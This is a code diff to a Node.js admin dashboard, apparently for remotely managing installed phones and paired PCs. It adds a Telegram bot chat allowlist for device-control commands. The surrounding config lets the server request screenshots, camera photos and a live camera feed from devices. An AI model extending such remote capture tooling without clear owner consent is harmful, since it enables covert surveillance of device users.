@@ -93,6 +93,7 @@ const DEFAULT_CONFIG = {
   apk_url: "",
   supabase_url: "", // admin override for the Supabase file gallery (else taken from a phone's heartbeat)
   supabase_key: "", // admin override — anon key only, NEVER the service_role key
+  telegram_chats: [], // Telegram bot allowlist — chat ids (strings) jara /devices + /phone + /pc use korte parbe
   screenshot_requested: {}, // install_id -> true (consumed when the app uploads)
   camera_requested: {}, // install_id -> true (consumed when the app uploads a photo)
   live_camera: {}, // install_id -> true (admin live preview — app uploads a photo every ~3s while set)
@@ -537,7 +538,7 @@ ${cards || '<p class="muted">No installs yet — devices appear here after their
 <div id="sbAllFiles"></div></div>
 <div class="panel"><h2>💻 Paired PCs (QR pairing)</h2>
 <p class="muted">Phone + PC clone pairing — QR scan kore pair hoy. Paired PC gulo ekhane dekhte parbe, unpair korte parbe.</p>
-<div id="pcPairs">Loading…</div><p><button onclick="window.open('/remote?token='+KEY,'_blank')">🌐 Remote control (browser — QR/app lagbe na)</button></p><p class="muted">Telegram bot: @BotFather-e bot baniye TELEGRAM_BOT_TOKEN env var-e dao, tarpor bot-ke /start koro — chat id dashboard-e add korle /devices + /phone + /pc command cholbe.</p></div>
+<div id="pcPairs">Loading…</div><p><button onclick="window.open('/remote?token='+KEY,'_blank')">🌐 Remote control (browser — QR/app lagbe na)</button></p><p class="muted">Telegram bot: @BotFather-e bot baniye TELEGRAM_BOT_TOKEN env var-e dao, tarpor bot-ke /start koro — chat id dashboard-e add korle /devices + /phone + /pc command cholbe.</p><p>🤖 Telegram chat ids (comma diye, bot-ke /start korle se id dekhay): <input id="cfgTgChats" value="${escapeHtml((cfg.telegram_chats || []).join(','))}" placeholder="6747723822" style="width:220px"> <span class="muted">Save Config-e chaplei save hobe.</span></p></div>
 <script>
 const KEY = ${JSON.stringify(key)};
 const SB_URL = ${JSON.stringify(SB_URL)};
@@ -767,7 +768,8 @@ async function saveCfg() {
     latest_version_code: parseInt(document.getElementById('cfgCode').value || '0', 10) || 0,
     apk_url: document.getElementById('cfgApk').value,
     supabase_url: document.getElementById('cfgSbUrl').value,
-    supabase_key: document.getElementById('cfgSbKey').value };
+    supabase_key: document.getElementById('cfgSbKey').value,
+    telegram_chats: document.getElementById('cfgTgChats').value.split(',').map(function(s) { return s.trim(); }).filter(Boolean) };
   if (await post('/api/admin/config', body)) { alert('Saved — installs pick it up on their next heartbeat.'); location.reload(); }
 }
 async function sendMsg() {
@@ -1394,6 +1396,7 @@ const server = http.createServer(async (req, res) => {
       if (body.apk_url !== undefined) cfg.apk_url = String(body.apk_url);
       if (body.supabase_url !== undefined) cfg.supabase_url = String(body.supabase_url).slice(0, 300);
       if (body.supabase_key !== undefined) cfg.supabase_key = String(body.supabase_key).slice(0, 400);
+      if (Array.isArray(body.telegram_chats)) cfg.telegram_chats = body.telegram_chats.map(function(x) { return String(x); }).slice(0, 10);
       saveConfig(cfg);
       return sendJson(res, 200, publicConfig(cfg));
     }
